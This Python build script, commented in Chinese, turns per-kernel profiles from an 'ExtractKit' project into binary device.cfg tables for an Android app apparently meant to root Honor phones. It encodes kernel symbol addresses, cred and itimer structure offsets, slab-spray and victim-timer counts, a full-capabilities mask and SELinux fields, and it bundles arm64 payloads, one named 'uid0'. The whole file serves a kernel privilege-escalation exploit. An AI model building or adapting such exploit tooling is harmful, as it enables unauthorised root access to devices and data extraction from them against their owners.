#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
把 ExtractKit-main 的内置 profile 转成 HonorRoot 可直接下发的 device.cfg 数据表。

为什么离线生成：ConfigGen.emitCfgBlob() 是 336 字节定长结构（38 个 u64 + 5 个 u32），
字段顺序错一位 payload 就会静默回落到编译期默认值，在错误内核上写坏内存。
这里用 Python 逐字段复现 Kotlin 实现，把结果固化成二进制表，App 只做「按内核查表 →
写出 336 字节」，不参与任何字节布局计算。

产物（全部落到 GhostLockApp/app/src/main/assets/extractkit/）：
  profiles.tsv   idx / kernelKey / release / prefix / models / name
  cfg.bin        N * 336 字节，第 idx 条 profile 的 device.cfg
  known.tsv      ConfigGen.KNOWN 的机型识别表（只有识别、没有偏移）
  iknow.tsv      ExtractKit 自带的 5479 行荣耀机型库
  payload/       5 支静态 arm64 ELF（uid0 / android / calib / fam 5.10,5.15,6.1）
"""
import re
import shutil
import struct
from pathlib import Path

ROOT = Path(r"D:\xa\下载\GhostLock-HonorFne-main")
SRC = ROOT / "ExtractKit-main"
CFG_KT = SRC / "app/src/main/kotlin/com/extractkit/app/ConfigGen.kt"
SRC_ASSETS = SRC / "app/src/main/assets"
OUT = ROOT / "GhostLockApp/app/src/main/assets/extractkit"

MASK64 = (1 << 64) - 1

# ConfigGen.Measured 的默认值（Kotlin data class 里写死的）
MEASURED_DEFAULTS = {
    "evCacheAlloc": 269,
    "evCacheFree": 272,
    "evPageFree": 273,
    "evPageAlloc": 275,
    "evPcpuDrain": 277,
    "timerSiteOffset": 0x94,
    "credSiteLow21": 0x38458,
    "credReq": 0xB8,
    "credAlloc": 0xC0,
    "taskAllocLow21": 0x1CB240,
    "taskAllocBytes": 0x12C0,
    "objectsPerSlab": 31,
    "paddingSlabs": 150,
    "ntimers": 4096,
    "victimIdx": 2048,
    "lockers": 3,
    "vmaCount": 50000,
    "selinuxBlobOff": 0x8,
    "selinuxSidKernel": 1,
}

OFFSET_FIELDS = [
    "itimerSize", "itimerNode", "itimerHead", "itimerElist", "itimerFiring",
    "itimerHandling", "taskCred", "taskComm", "credSize", "credUid",
    "credSecurity", "credUser", "credUserNs", "credUcounts", "credGroups",
]

SYMBOL_KEYS = [
    "do_timer_create", "selinux_state", "panic_on_warn", "root_user",
    "init_user_ns", "init_ucounts", "init_groups",
]

ANCHOR_SYMBOLS = ("root_user", "init_user_ns", "init_groups")

# ConfigGen.Baseline.offsets（6.6.118 基线），有 profile 直接引用它
BASELINE_OFFSETS = {
    "itimerSize": 0x108, "itimerNode": 0x78, "itimerHead": 0x98,
    "itimerElist": 0xA8, "itimerFiring": 0xB8, "itimerHandling": 0xC0,
    "taskCred": 0x820, "taskComm": 0x830, "credSize": 0xB8, "credUid": 0x8,
    "credSecurity": 0x80, "credUser": 0x88, "credUserNs": 0x90,
    "credUcounts": 0x98, "credGroups": 0xA0,
}


def num(tok: str) -> int:
    """解析 0x...uL.toLong() / 0x...L / 十进制。"""
    m = re.search(r"0x[0-9A-Fa-f]+|\d+", tok)
    if not m:
        raise ValueError("无法解析数值: " + tok[:60])
    s = m.group(0)
    return int(s, 16) if s.lower().startswith("0x") else int(s)


def strip_comments(s: str) -> str:
    """去掉 // 与 /* */ 注释，保留字符串字面量。"""
    out = []
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c == '"':
            j = i + 1
            while j < n:
                if s[j] == "\\":
                    j += 2
                    continue
                if s[j] == '"':
                    j += 1
                    break
                j += 1
            out.append(s[i:j])
            i = j
            continue
        if c == "/" and i + 1 < n and s[i + 1] == "/":
            j = s.find("\n", i)
            i = n if j < 0 else j
            continue
        if c == "/" and i + 1 < n and s[i + 1] == "*":
            j = s.find("*/", i + 2)
            i = n if j < 0 else j + 2
            continue
        out.append(c)
        i += 1
    return "".join(out)


def code_blocks(text: str, start_pos: int, keyword: str):
    """
    从 start_pos 起扫描，收集所有顶层 `keyword(` 调用的完整括号块。
    跳过字符串/注释里的括号，按括号深度配对。
    """
    s = strip_comments(text)
    # strip_comments 会缩短文本，故重新定位：用原始文本找 listOf( 起点，
    # 这里直接在整个清洗后的文本里找第一个 `keyword(` 起点即可。
    blocks = []
    i = 0
    n = len(s)
    while True:
        i = s.find(keyword + "(", i)
        if i < 0:
            break
        # 排除 `data class Profile(` / `object Profile(` 之类声明
        prev = s[max(0, i - 20):i]
        if re.search(r"(class|object|fun)\s+$", prev):
            i += len(keyword)
            continue
        j = i + len(keyword)
        depth = 0
        k = j
        in_str = False
        while k < n:
            c = s[k]
            if c == '"':
                if in_str and k > 0 and s[k - 1] == "\\":
                    k += 1
                    continue
                in_str = not in_str
            elif not in_str:
                if c == "(":
                    depth += 1
                elif c == ")":
                    depth -= 1
                    if depth == 0:
                        break
            k += 1
        if depth != 0:
            raise RuntimeError("括号不配对: " + keyword)
        blocks.append(s[j + 1:k])
        i = k + 1
    return blocks


def field_str(block: str, name: str, default=None):
    m = re.search(r"\b" + name + r'\s*=\s*"([^"]*)"', block)
    return m.group(1) if m else default


def kv_block(block: str, ctor: str):
    """取 ctor(...) 的内部文本；值里可能含 .toLong()，必须按括号深度配对。"""
    m = re.search(r"\b" + ctor + r"\s*\(", block)
    if not m:
        return ""
    start = m.end()
    depth, in_str, k = 1, False, start
    while k < len(block):
        c = block[k]
        if c == '"':
            if in_str and block[k - 1] == "\\":
                k += 1
                continue
            in_str = not in_str
        elif not in_str:
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    return block[start:k]
        k += 1
    return ""


def kv_map(body: str, pattern: str):
    out = {}
    for key, val in re.findall(pattern, body, re.S):
        out[key] = num(val)
    return out


def kernel_key(release: str) -> str:
    """复刻 ConfigGen.kernelKey：主版本号 + g<hash> 前 12 位。"""
    s = (release or "").strip().lower()
    if not s:
        return ""
    m = re.match(r"\d+\.\d+\.\d+", s)
    ver = m.group(0) if m else s[:8]
    h = re.search(r"g([0-9a-f]{8,40})", s)
    return ver + "-g" + h.group(1)[:12] if h else ver


def emit_cfg(syms: dict, off: dict, m: dict) -> bytes:
    """逐字段复刻 ConfigGen.emitCfgBlob()，产出 336 字节 device.cfg。"""
    timer = syms.get("do_timer_create", 0) & MASK64
    static = (timer + m["timerSiteOffset"]) & MASK64 if timer else 0
    u64 = [
        static,                                   # static_timer_site
        static & 0x1FFFFF,                        # timer_site_low21
        syms.get("selinux_state", 0),             # selinux_state_static
        syms.get("panic_on_warn", 0),             # panic_on_warn_static
        syms.get("root_user", 0),                 # root_user_static
        syms.get("init_user_ns", 0),              # init_user_ns_static
        syms.get("init_ucounts", 0),              # init_ucounts_static
        syms.get("init_groups", 0),               # init_groups_static
        off["taskCred"],                          # off_task_cred
        off["taskComm"],                          # off_task_comm
        m["taskAllocLow21"],                      # task_alloc_low21
        m["taskAllocBytes"],                      # task_alloc_bytes
        m["taskAllocBytes"],                      # task_alloc_round
        m["credReq"],                             # cred_req
        m["credAlloc"],                           # cred_alloc
        m["credSiteLow21"],                       # cred_site_low21
        off["itimerSize"],                        # itimer_size
        off["itimerNode"],                        # itimer_node
        off["itimerHead"],                        # itimer_head
        off["itimerElist"],                       # itimer_elist
        off["itimerFiring"],                      # itimer_firing
        off["itimerHandling"],                    # itimer_handling
        off["itimerSize"],                        # timer_obj
        off["credUid"],                           # cred_uid_off
        off["credSecurity"],                      # cred_off_security
        off["credUser"],                          # cred_off_user
        off["credUserNs"],                        # cred_off_user_ns
        off["credUcounts"],                       # cred_off_ucounts
        off["credGroups"],                        # cred_off_groups
        0x1F00,                                   # cred_blob_off
        m["selinuxBlobOff"],                      # selinux_blob_off
        m["selinuxSidKernel"],                    # selinux_sid_kernel
        0x1FFFFFFFFFF,                            # fullcap
        m["ntimers"],                             # ntimers
        m["victimIdx"],                           # victim_idx
        m["paddingSlabs"] * m["objectsPerSlab"],  # padding_timers
        m["lockers"],                             # lockers
        m["vmaCount"],                            # vma_count
    ]
    if len(u64) != 38:
        raise RuntimeError("u64 字段数应为 38，实际 %d" % len(u64))
    ev = [m["evCacheAlloc"], m["evCacheFree"], m["evPageFree"],
          m["evPageAlloc"], m["evPcpuDrain"]]
    blob = bytearray(b"EXKCFG01")
    blob += struct.pack("<I", 38)
    for v in u64:
        blob += struct.pack("<Q", int(v) & MASK64)
    for v in ev:
        blob += struct.pack("<i", int(v))
    assert len(blob) == 336, len(blob)
    return bytes(blob)


def main():
    text = CFG_KT.read_text(encoding="utf-8", errors="ignore")
    marker = "private val BUILTIN_PROFILES"
    pos = text.find(marker)
    if pos < 0:
        raise RuntimeError("找不到 BUILTIN_PROFILES")
    # 只在 listOf(...) 区间内找 Profile(
    section = text[pos:]
    blocks = code_blocks(section, 0, "Profile")

    rows, blobs, skipped = [], [], []
    for i, b in enumerate(blocks):
        name = field_str(b, "name", "")
        prefix = field_str(b, "prefix", "")
        release = field_str(b, "release", "")
        if not prefix or not release:
            skipped.append((i, "缺 prefix/release"))
            continue
        models_m = re.search(r"\bmodels\s*=\s*listOf\((.*?)\)", b, re.S)
        models = "|".join(re.findall(r'"([^"]*)"', models_m.group(1))) if models_m else ""

        sym_body = kv_block(b, "mapOf")
        syms = kv_map(sym_body, r'"([A-Za-z0-9_]+)"\s+to\s+([^,\n]+)')
        if any(syms.get(k, 0) == 0 for k in ANCHOR_SYMBOLS):
            skipped.append((i, "%s 缺 cred 锚点符号" % name))
            continue

        if re.search(r"\boffsets\s*=\s*Baseline\.offsets", b):
            off = dict(BASELINE_OFFSETS)
        else:
            off_body = kv_block(b, "Offsets")
            off = kv_map(off_body, r"\b([A-Za-z0-9_]+)\s*=\s*([^,\n]+)")
        missing = [k for k in OFFSET_FIELDS if k not in off]
        if missing:
            skipped.append((i, "%s Offsets 缺字段 %s" % (name, ",".join(missing))))
            continue

        m = dict(MEASURED_DEFAULTS)
        m_body = kv_block(b, "Measured")
        m.update(kv_map(m_body, r"\b([A-Za-z0-9_]+)\s*=\s*([^,\n]+)"))

        try:
            blob = emit_cfg(syms, off, m)
        except Exception as e:
            skipped.append((i, "%s cfg 生成失败: %s" % (name, e)))
            continue

        idx = len(blobs)
        blobs.append(blob)
        rows.append((idx, kernel_key(release), release, prefix, models, name))

    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "cfg.bin").write_bytes(b"".join(blobs))
    with (OUT / "profiles.tsv").open("w", encoding="utf-8", newline="\n") as f:
        for r in rows:
            f.write("\t".join(str(x) for x in r) + "\n")

    # KNOWN：只有识别、没有偏移的机型
    kpos = text.find("val KNOWN: List<Known> = listOf(")
    known_rows = []
    if kpos >= 0:
        ksec = text[kpos:]
        for model, rel, verified in re.findall(
            r'Known\("([^"]*)",\s*"([^"]*)",.*?,\s*(true|false)\)', ksec, re.S
        ):
            known_rows.append((model, rel, verified))
    with (OUT / "known.tsv").open("w", encoding="utf-8", newline="\n") as f:
        for model, rel, verified in known_rows:
            f.write("%s\t%s\t%s\n" % (model, rel, verified))

    # 机型识别库与 payload 二进制直接复制
    shutil.copy2(SRC_ASSETS / "iknow.tsv", OUT / "iknow.tsv")
    pdir = OUT / "payload"
    pdir.mkdir(parents=True, exist_ok=True)
    for f in (SRC_ASSETS / "payload").rglob("*"):
        if f.is_file() and f.suffix != ".txt" and (SRC_ASSETS / "payload" / "SHA256SUMS.txt") != f:
            rel = f.relative_to(SRC_ASSETS / "payload")
            dst = pdir / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(f, dst)

    print("Profile 块解析:", len(blocks))
    print("有效 profile:", len(rows), " 跳过:", len(skipped))
    for i, why in skipped[:15]:
        print("  skip#%d %s" % (i, why))
    print("cfg.bin:", (OUT / "cfg.bin").stat().st_size, "bytes =", len(blobs), "* 336")
    print("KNOWN 条目:", len(known_rows))
    print("payload 文件:", sorted(str(p.relative_to(pdir)) for p in pdir.rglob("*") if p.is_file()))
    print("前 5 条:")
    for r in rows[:5]:
        print("  ", r[0], r[1], r[4], r[5])


if __name__ == "__main__":
    main()
